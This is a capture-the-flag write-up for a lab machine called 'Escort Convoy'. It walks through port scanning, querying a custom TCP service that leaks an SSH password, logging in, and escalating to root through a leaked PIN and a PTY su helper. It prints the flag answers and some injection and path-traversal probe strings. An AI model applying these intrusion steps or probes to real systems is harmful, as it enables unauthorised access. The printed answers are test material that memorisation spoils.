<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Escort+Convoy" alt="Typing SVG" /></a>

</div>

# Escort Convoy — PWN · JID-Pwn103 · Level 1 · 🟢 EASY

- **Status:** ✅ SOLVED (4/4) — full boot2root chain to `root.txt`.
- **Points:** 812 / 812 (ports 112 · user 150 · user flag 225 · root 325)
- **Flags:** Open TCP ports → Low privilege user → User flag → Root flag (`CTF{...}` for the file flags)
- **Target:** `10.10.10.13` (lab, over WireGuard VPN)
- **Prompt:** *"Dispatch board for a civil escort convoy" — boot2root chain.*

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `2022,7777` | ✅ |
| 2 | Low privilege user | `driver` | ✅ |
| 3 | User flag | `CTF{076edd8e3d6a1fcea6e6516774757a69}` | ✅ |
| 4 | Root flag | `CTF{c44449a70370cd0410c690e5432858be}` | ✅ |

---

## TL;DR

1. `nmap` → `2022,7777`; port 7777 is a custom line-based "Convoy board" TCP service.
2. Protocol `3 K7` leaks the escort passphrase `river-lamp-6`; the username is theme-derived (`driver`, never served) → SSH foothold.
3. `user.txt` at `/home`; `~/.config/dispatcher.conf` leaks root pin `hatch-88`; the planted `/tmp/su.py` PTY helper applies it → `su` → `root.txt`.

Third sibling of `HarborWatch` and `NightWatchRoster` (same author/mould), but the foothold mechanic differs: instead of a web app, a **custom line-based TCP service** leaks a passphrase. recon → TCP "Convoy board" leaks the SSH password → foothold as `driver` (username is theme-derived, not served) → `user.txt` near `/home` → a config file leaks the root password → provided `su` helper → `root.txt`.

---

## 0. Connect to the lab

```bash
wg-quick up team71-player-a            # bring up the team WireGuard tunnel
ping -c1 10.10.10.13                   # confirm reachability over the VPN
```

---

## Recon — Flag 1: Open TCP ports

Reliable full SYN scan (the first `-T4 --min-rate` run hit the retransmission cap and mislabeled ports; a clean `-sS` pass resolved it):

```bash
sudo nmap -sS -p- -T4 --max-retries 6 10.10.10.13 -oN nmap-full2.txt
```

```
2022/tcp open  ssh
7777/tcp open  (custom)
```

Service detection:

```bash
sudo nmap -sC -sV -p 2022,7777 10.10.10.13 -oN nmap-det.txt
```

```
2022/tcp open ssh  OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
7777/tcp open ?    custom line service; NULL probe returns:
                   "Convoy board / Civil escort unit is K7. Other unit codes are exercise decoys. / 1) list  3) last order"
```

**Flag 1** = open ports only, ascending, comma-separated, plaintext:

```
2022,7777
```

> SSH 9.2p1 is patched (not the vector). The `BaseHTTPServer` web app of the siblings is replaced here by a hand-rolled TCP socket service on 7777 — that is the attack surface.

---

## Foothold — Flag 2: Low privilege user

### The Convoy board (7777) — leaking the passphrase

The service greets, then reads one line. `input.split()`; if `parts[0] == "3"` it treats `parts[1]` as a unit code and returns that unit's "last order", else it prints the unit list. So the protocol is **`3 <unit>`**:

```bash
printf '1\n'      | nc -w3 10.10.10.13 7777   # list -> "units on the board: K2 K7 K9"
printf '3\nK7\n'  | nc -w3 10.10.10.13 7777   # last order of K7 -> "escort passphrase: river-lamp-6"
printf '3\nK2\n'  | nc -w3 10.10.10.13 7777   # "decoy passphrase: winter-1"
printf '3\nK9\n'  | nc -w3 10.10.10.13 7777   # "decoy passphrase: winter-9"
```

K7 is the **civil escort** unit (stated real); K2/K9 are decoys. The real "last order":

```
escort passphrase: river-lamp-6
```

**Password = `river-lamp-6`** (literal). Enumerating the unit space (`K0`–`K9`) confirmed only K2/K7/K9 exist — no hidden unit, no IDOR. The service is a plain dict lookup: no injection, no path traversal (`3\n../../etc/passwd` → "no such unit"; `K7;id` → "no such unit"; only a valid unit *token* after a space matches).

### Deriving the username (the part that cost time)

The service leaks the **password only** — it never gives a username. There is also **no SSH banner** (`ssh -o PreferredAuthentications=none` reveals nothing) and only 2 ports exist. So the username had to be **derived from the theme**, not read off the box.

Failed candidates (all `Permission denied`, confirmed via `sshpass` to rule out typos): `escort`, `convoy`, `civil`, `pilot`, `k7`, `river`, `kilo`, `dispatch`, `dispatcher`.

The winner came from the official blurb — *"Dispatch board for a civil **escort convoy**"*: the person driving the convoy is the **`driver`**.

```bash
sshpass -p 'river-lamp-6' ssh -p 2022 -o NumberOfPasswordPrompts=1 driver@10.10.10.13 id
# uid=1000(driver) gid=1000(driver) groups=1000(driver)
```

**Flag 2** (low-priv username, plaintext) = `driver`

> Unlike HarborWatch, `driver` has **no secondary group** — the group-readable-file privesc does not apply here.

---

## User flag — Flag 3

Not in `~`; one level up, owner-readable (same placement as HarborWatch):

```bash
find / -iname 'user.txt' 2>/dev/null        # /home/user.txt (-r-------- 1 driver driver)
cat /home/user.txt
```

**Flag 3** = `CTF{076edd8e3d6a1fcea6e6516774757a69}`

---

## Privesc — Flag 4: Root flag

No `sudo` (`sudo -n -l` empty), no secondary group, standard SUID set only (no GTFOBins win), no capabilities. The win is two planted artifacts in the user's environment.

### The leaked root password

`driver`'s own config holds it:

```bash
cat ~/.config/dispatcher.conf
```

```
# fallback_pin is printed at the gate and is a decoy
fallback_pin=0000
# maintenance_pin opens the cabinet account
maintenance_pin=hatch-88
```

`fallback_pin=0000` is the decoy; **`maintenance_pin=hatch-88`** "opens the cabinet account". The only accounts with a login shell are `root` and `driver` (`grep -vE 'nologin|/false' /etc/passwd`) — so the "cabinet account" is **root**, and `hatch-88` is root's password.

### The provided `su` helper

The author left `/tmp/su.py` (owned by `driver`, readable): it allocates a PTY with `pty.fork()`, runs `su -c <cmd>`, and feeds `argv[1]` as the password when it sees the `assword` prompt. This is exactly the tool to use a root password from a non-TTY SSH session (plain `su` would reject "must be run from a terminal"):

```bash
sshpass -p 'river-lamp-6' ssh -p 2022 driver@10.10.10.13 \
  "python3 /tmp/su.py 'hatch-88' 'id; cat /root/root.txt'"
# uid=0(root) ...
# CTF{c44449a70370cd0410c690e5432858be}
```

**Flag 4** = `CTF{c44449a70370cd0410c690e5432858be}`

> The 7777 service runs as root (`python3 /opt/app/menu.py`) but `menu.py` is not writable and imports nothing external — no RCE there. `/opt/lib/drop.py` is a non-writable red herring. The intended path is purely the leaked PIN + the `su.py` helper.

---

## Summary / Chain

| # | Flag | Value | Vector |
|---|------|-------|--------|
| 1 | Open TCP ports | `2022,7777` | `nmap -sS -p-` (reliable rescan) |
| 2 | Low privilege user | `driver` | Convoy board (7777) `3 K7` → password `river-lamp-6`; **username theme-derived** (convoy *driver*) |
| 3 | User flag | `CTF{076edd8e3d6a1fcea6e6516774757a69}` | `/home/user.txt` (owner-readable) |
| 4 | Root flag | `CTF{c44449a70370cd0410c690e5432858be}` | `~/.config/dispatcher.conf` leaks root pin `hatch-88` → `/tmp/su.py` helper → `su` → `/root/root.txt` |

### Takeaways
- The TCP service leaks a **password only**; the **username was not on the box** — derive it from the challenge theme (`driver`). Don't burn time hunting a username that was never served (only 2 ports, no banner, no injection, no hidden unit).
- Distinguish real vs decoy by the service's own labels (`escort passphrase` vs `decoy passphrase`), and `fallback_pin` (decoy) vs `maintenance_pin` (real).
- Privesc was not an exploit: a leaked PIN in a user-readable config + a planted `su` helper (PTY wrapper) to apply it non-interactively.

### Note
- Claude never ran anything against the target; every command was executed manually by the player.
